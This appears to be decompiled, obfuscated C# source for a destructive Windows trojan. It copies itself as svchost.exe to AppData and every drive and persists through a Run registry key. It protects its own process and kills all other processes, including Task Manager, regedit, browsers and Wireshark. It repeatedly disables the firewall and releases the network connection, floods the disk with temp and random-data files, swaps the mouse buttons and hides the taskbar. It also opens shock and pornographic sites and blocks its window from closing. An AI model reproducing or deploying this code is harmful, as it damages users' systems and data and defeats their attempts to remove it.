using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace cOd6pt08ewVXCYj0RSmhmhgHEp2dXTPgMR9bF;

public class cOd6pt08ewVXCYj0RSmhmhgHEp2dXT : Form
{
	[Flags]
	private enum ProcessAccessRights
	{
		ProcessAllAccess = 0x1F0FFF
	}

	private const string llZnK9WQW6dFnuVAzeHGv5cCNMaDrnkXCy6JcLcS9N = "svchost";

	private string[] H2aNY86RVZ0anO7A;

	private Point xrE0KfPoMw3SHCCWBs;

	private IContainer T8QpYeZpLqQmGWOWknYS;

	private Timer T8QpYeZpLqQmGWOWknYSKC92p0zLqeFkwJvL8NfzeR7OQ;

	private Timer JxkCKlIWCXT40KjjDFnGKiGgSEt3zjdhy6Kqy0O5K1Hv;

	private Timer timer_0;

	private Timer timer_1;

	private Timer sVGrcj3ZzLs30oIi5vf5;

	private Timer ikaEYpMwqiwLjcdFnOET;

	private Timer ikaEYpMwqiwLjcdFnOETZPCGtTSby9zFrhasu2RMP5BP;

	private Timer E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR7wKD;

	private Timer timer_2;

	private Timer timer_3;

	private Timer Q71GbuP6fC8sCE708XV5emz657hix0U2lszuq4U;

	[DllImport("user32.dll")]
	private static extern int SwapMouseButton(int bSwap);

	private static void SwapMouse(int value)
	{
		try
		{
			SwapMouseButton(value);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	private static void TaskBar(int value)
	{
		try
		{
			int hwnd = FindWindow("Shell_TrayWnd", "");
			ShowWindow(hwnd, value);
		}
		catch
		{
		}
	}

	private static void OnExecution()
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.Id != currentProcess.Id)
			{
				try
				{
					process.Kill();
				}
				catch
				{
				}
			}
		}
	}

	private static void PlaySong()
	{
		while (true)
		{
			Console.Beep(890, 400);
			Console.Beep(990, 400);
			Console.Beep(790, 400);
			Console.Beep(390, 400);
			Console.Beep(590, 1600);
		}
	}

	public cOd6pt08ewVXCYj0RSmhmhgHEp2dXT()
	{
		ZENYxbLOXcqbnaIBQjhun9u1eupJ1upJb9();
		Install(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
	}

	private static void Install(string path)
	{
		try
		{
			if (!(Application.get_StartupPath() == path))
			{
				File.Copy(Application.get_ExecutablePath(), path + "\\svchost.exe");
				Process.Start(path + "\\svchost.exe");
				Process.GetCurrentProcess().Kill();
			}
		}
		catch
		{
		}
	}

	private void T8QpYeZpLqQmGWOWknYSKC92p0zLqeFkwJvL8NfzeR7OQ_Tick(object sender, EventArgs e)
	{
		for (int i = 0; i < 3; i++)
		{
			((Control)this).Hide();
		}
		T8QpYeZpLqQmGWOWknYSKC92p0zLqeFkwJvL8NfzeR7OQ.Stop();
	}

	private void InpV8PM7ZXvl(object sender, EventArgs e)
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			H2aNY86RVZ0anO7A = "taskmgr.cmd.msconfig.wmplayer.calc.notepad.regedit.explorer.skype.aim.steam.origin.utorrent.bittorrent.desura.powershell.winrar.winword.excel.powerpnt.outlook.vlc.javaw.mirc.ccleaner.poweriso.mspaint.photoshop.teamviewer.defraggler.moviemaker.wireshark.acrord.rstrui.filezilla.vmware.firefox.chrome.iexplore.opera.tbb-firefox.torch.manycam.gimp.itunes.recuva.pidgin.truecrypt.fraps.skydrive.picasa".Split(new char[1] { '.' });
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					try
					{
						File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo.RootDirectory, Path.GetFileName(Application.get_ExecutablePath())));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			Protect(AceQualifier.AccessDenied);
			MessageBox.Show("dasasd\r\n", "adssad");
			new Thread(Bomb).Start();
			if (H2aNY86RVZ0anO7A[0] != "")
			{
				JxkCKlIWCXT40KjjDFnGKiGgSEt3zjdhy6Kqy0O5K1Hv.set_Enabled(true);
			}
			new Thread(SetReg).Start();
			timer_2.set_Enabled(true);
			timer_1.set_Enabled(true);
			ikaEYpMwqiwLjcdFnOET.set_Enabled(true);
			ikaEYpMwqiwLjcdFnOETZPCGtTSby9zFrhasu2RMP5BP.set_Enabled(true);
			E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR7wKD.set_Enabled(true);
			timer_0.set_Enabled(true);
			new Thread(Calculus).Start();
			timer_3.set_Enabled(true);
			sVGrcj3ZzLs30oIi5vf5.set_Enabled(true);
			OnExecution();
			SwapMouse(1);
			TaskBar(0);
			new Thread(DisableFirewall).Start();
			new Thread(PlaySong).Start();
			new Thread(DisConnecter).Start();
			xrE0KfPoMw3SHCCWBs = Cursor.get_Position();
			new Thread(PX7ZzYUhCCKJJkrgQJMGsKzgxNOnO1AkhSREtPa0l9DLxWAkX).Start();
			new Thread(WriteFile).Start();
		}
		catch
		{
		}
	}

	private static void Bomb()
	{
		int num = 0;
		while (true)
		{
			try
			{
				File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + num + ".tmp");
			}
			catch
			{
			}
			num++;
		}
	}

	private static void WriteFile()
	{
		try
		{
			using FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.tmp", FileMode.Append);
			Random random = new Random();
			byte[] array = new byte[1];
			while (true)
			{
				random.NextBytes(array);
				fileStream.WriteByte(array[0]);
			}
		}
		catch
		{
		}
	}

	private void PX7ZzYUhCCKJJkrgQJMGsKzgxNOnO1AkhSREtPa0l9DLxWAkX()
	{
		while (true)
		{
			Thread.Sleep(130);
			Cursor.set_Position(xrE0KfPoMw3SHCCWBs);
		}
	}

	private static void Calculus()
	{
		int num = 0;
		while (true)
		{
			if (num == 200)
			{
				num = 0;
			}
			num += 2;
		}
	}

	private void PX7ZzYUhCCKJJkrgQJMGsKzgxNOnO1AkhSRE(object sender, EventArgs e)
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] h2aNY86RVZ0anO7A = H2aNY86RVZ0anO7A;
			foreach (string value in h2aNY86RVZ0anO7A)
			{
				if (process.ProcessName.ToLower().Contains(value) && process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}

	private static void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void DisableFirewall()
	{
		while (true)
		{
			Thread.Sleep(5000);
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "netsh.exe";
				process.StartInfo.Arguments = "firewall set opmode disable";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			catch
			{
			}
		}
	}

	private static void Shutdown(string arguements)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "shutdown.exe";
			process.StartInfo.Arguments = arguements;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private void MWjfNeKY6P3P(object sender, EventArgs e)
	{
		Random random = new Random();
		timer_0.set_Interval(random.Next(1000, 10001));
		new Thread(BeepThread).Start();
	}

	private static void BeepThread()
	{
		Console.Beep();
	}

	private void kJ9h0iNyV9GwYuDGps05b1WLP8V2UFbp1NkpH8SA6v(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			timer_1.set_Interval(random.Next(4000, 120001));
			switch (random.Next(0, 4))
			{
			case 0:
				Process.Start("mspaint.exe");
				break;
			case 1:
				Process.Start("write.exe");
				break;
			case 2:
				Process.Start("explorer.exe");
				break;
			case 3:
				Process.Start("notepad.exe");
				break;
			}
		}
		catch
		{
		}
	}

	private void fdcJsm19In6HhhJ2TwItytAM0E64ior0mnk8(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			sVGrcj3ZzLs30oIi5vf5.set_Interval(random.Next(1000, 120000));
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void Z6InFwYhm9zBTQkKGSPGVCL1EO9pQdeyIkzw(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			int num = random.Next(0, 8);
			ikaEYpMwqiwLjcdFnOET.set_Interval(random.Next(5000, 120001));
			switch (num)
			{
			case 0:
				Process.Start("http://www.asspong.com");
				break;
			case 1:
				Process.Start("http://meatspin.com");
				break;
			case 2:
				Process.Start("http://www.youporngay.com");
				break;
			case 3:
				Process.Start("http://www.octopusgirl.com");
				break;
			case 4:
				Process.Start("http://www.loltrain.com");
				break;
			case 5:
				Process.Start("http://www.youporn.com");
				break;
			case 6:
				Process.Start("http://trololololololololololo.com");
				break;
			case 7:
				Process.Start("http://www.prolapsed.net");
				break;
			}
		}
		catch
		{
		}
	}

	private void ni3BFHKo20f0w6JsKjvGa(object sender, EventArgs e)
	{
		Point position = default(Point);
		Random random = new Random();
		int num = random.Next(2);
		int num2 = random.Next(2);
		ikaEYpMwqiwLjcdFnOETZPCGtTSby9zFrhasu2RMP5BP.set_Interval(random.Next(1000, 60001));
		if (num == 1)
		{
			position.X = Control.get_MousePosition().X + random.Next(1, 501);
		}
		else
		{
			position.X = Control.get_MousePosition().X - random.Next(1, 501);
		}
		if (num2 == 1)
		{
			position.Y = Control.get_MousePosition().Y + random.Next(1, 501);
		}
		else
		{
			position.Y = Control.get_MousePosition().Y - random.Next(1, 501);
		}
		Cursor.set_Position(position);
	}

	private static void StringGen()
	{
		try
		{
			Random random = new Random((int)DateTime.Now.Ticks);
			string text = string.Empty;
			for (int i = 0; i < 31; i++)
			{
				text += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".Length)];
			}
			SendKeys.Send(text);
		}
		catch
		{
		}
	}

	private void GYqi6WL6v6kAs8(object sender, EventArgs e)
	{
		Random random = new Random();
		E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR7wKD.set_Interval(random.Next(5000, 120001));
		StringGen();
	}

	private void eLhkj0PGjrXhLA7S3Xah01jMAklouFCcOchEkH6(object sender, EventArgs e)
	{
		Random random = new Random();
		timer_2.set_Interval(random.Next(5000, 60001));
		new Thread(OpenDisk).Start();
	}

	[DllImport("winmm.dll")]
	private static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);

	private static void OpenDisk()
	{
		try
		{
			mciSendStringA("set CDAudio door open", "", 127L, 0L);
		}
		catch
		{
		}
	}

	private void Ny8lx5Sg8LAY421eO5rugygcbyKwswY(object sender, EventArgs e)
	{
		Random random = new Random();
		timer_3.set_Interval(random.Next(1000, 120001));
		ShowMsg();
	}

	private static void SetReg()
	{
		while (true)
		{
			Thread.Sleep(1000);
			try
			{
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "svchost", Application.get_ExecutablePath());
			}
			catch
			{
			}
		}
	}

	private static void DisConnecter()
	{
		while (true)
		{
			Thread.Sleep(5000);
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "ipconfig.exe";
				process.StartInfo.Arguments = "/release";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			catch
			{
			}
		}
	}

	private static void tmrClipBoard_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(".");
		}
		catch
		{
		}
	}

	private static void ShowMsg()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		Form val = new Form();
		val.set_Size(new Size(1, 1));
		val.set_StartPosition((FormStartPosition)0);
		Rectangle virtualScreen = SystemInformation.get_VirtualScreen();
		val.set_Location(new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10));
		((Control)val).Show();
		((Control)val).Focus();
		((Control)val).BringToFront();
		val.set_TopMost(true);
		MessageBox.Show((IWin32Window)(object)val, string.Empty, string.Empty, (MessageBoxButtons)0);
		((Component)(object)val).Dispose();
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void Protect(AceQualifier ace)
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescript = GetProcessSecurityDescript(currentProcess);
			processSecurityDescript.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, ace, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			byte[] array = new byte[processSecurityDescript.BinaryLength];
			processSecurityDescript.GetBinaryForm(array, 0);
			SetKernelObjectSecurity(currentProcess, 4, array);
		}
		catch
		{
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	private static RawSecurityDescriptor GetProcessSecurityDescript(IntPtr prHandle)
	{
		try
		{
			byte[] pSecurityDescriptor = new byte[0];
			GetKernelObjectSecurity(prHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
			if ((long)lpnLengthNeeded > 32767L)
			{
				return null;
			}
			return (!GetKernelObjectSecurity(prHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded)) ? null : new RawSecurityDescriptor(pSecurityDescriptor, 0);
		}
		catch
		{
			return null;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	protected override void Dispose(bool disposing)
	{
		if (disposing && T8QpYeZpLqQmGWOWknYS != null)
		{
			T8QpYeZpLqQmGWOWknYS.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void ZENYxbLOXcqbnaIBQjhun9u1eupJ1upJb9()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		T8QpYeZpLqQmGWOWknYS = new Container();
		T8QpYeZpLqQmGWOWknYSKC92p0zLqeFkwJvL8NfzeR7OQ = new Timer(T8QpYeZpLqQmGWOWknYS);
		JxkCKlIWCXT40KjjDFnGKiGgSEt3zjdhy6Kqy0O5K1Hv = new Timer(T8QpYeZpLqQmGWOWknYS);
		timer_0 = new Timer(T8QpYeZpLqQmGWOWknYS);
		timer_1 = new Timer(T8QpYeZpLqQmGWOWknYS);
		sVGrcj3ZzLs30oIi5vf5 = new Timer(T8QpYeZpLqQmGWOWknYS);
		ikaEYpMwqiwLjcdFnOET = new Timer(T8QpYeZpLqQmGWOWknYS);
		ikaEYpMwqiwLjcdFnOETZPCGtTSby9zFrhasu2RMP5BP = new Timer(T8QpYeZpLqQmGWOWknYS);
		E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR7wKD = new Timer(T8QpYeZpLqQmGWOWknYS);
		timer_2 = new Timer(T8QpYeZpLqQmGWOWknYS);
		timer_3 = new Timer(T8QpYeZpLqQmGWOWknYS);
		Q71GbuP6fC8sCE708XV5emz657hix0U2lszuq4U = new Timer(T8QpYeZpLqQmGWOWknYS);
		((Control)this).SuspendLayout();
		T8QpYeZpLqQmGWOWknYSKC92p0zLqeFkwJvL8NfzeR7OQ.set_Enabled(true);
		T8QpYeZpLqQmGWOWknYSKC92p0zLqeFkwJvL8NfzeR7OQ.add_Tick((EventHandler)T8QpYeZpLqQmGWOWknYSKC92p0zLqeFkwJvL8NfzeR7OQ_Tick);
		JxkCKlIWCXT40KjjDFnGKiGgSEt3zjdhy6Kqy0O5K1Hv.set_Interval(500);
		JxkCKlIWCXT40KjjDFnGKiGgSEt3zjdhy6Kqy0O5K1Hv.add_Tick((EventHandler)PX7ZzYUhCCKJJkrgQJMGsKzgxNOnO1AkhSRE);
		timer_0.set_Interval(1000);
		timer_0.add_Tick((EventHandler)MWjfNeKY6P3P);
		timer_1.add_Tick((EventHandler)kJ9h0iNyV9GwYuDGps05b1WLP8V2UFbp1NkpH8SA6v);
		sVGrcj3ZzLs30oIi5vf5.add_Tick((EventHandler)fdcJsm19In6HhhJ2TwItytAM0E64ior0mnk8);
		ikaEYpMwqiwLjcdFnOET.add_Tick((EventHandler)Z6InFwYhm9zBTQkKGSPGVCL1EO9pQdeyIkzw);
		ikaEYpMwqiwLjcdFnOETZPCGtTSby9zFrhasu2RMP5BP.add_Tick((EventHandler)ni3BFHKo20f0w6JsKjvGa);
		E1m4coWypbigjwpE6J557Kkh2bD5Y2tSSGK9KWBR7wKD.add_Tick((EventHandler)GYqi6WL6v6kAs8);
		timer_2.add_Tick((EventHandler)eLhkj0PGjrXhLA7S3Xah01jMAklouFCcOchEkH6);
		timer_3.set_Interval(1000);
		timer_3.add_Tick((EventHandler)Ny8lx5Sg8LAY421eO5rugygcbyKwswY);
		Q71GbuP6fC8sCE708XV5emz657hix0U2lszuq4U.set_Interval(1000);
		Q71GbuP6fC8sCE708XV5emz657hix0U2lszuq4U.add_Tick((EventHandler)tmrClipBoard_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(32, 28));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("FrmMain");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((Form)this).add_Load((EventHandler)InpV8PM7ZXvl);
		((Control)this).ResumeLayout(false);
	}
}
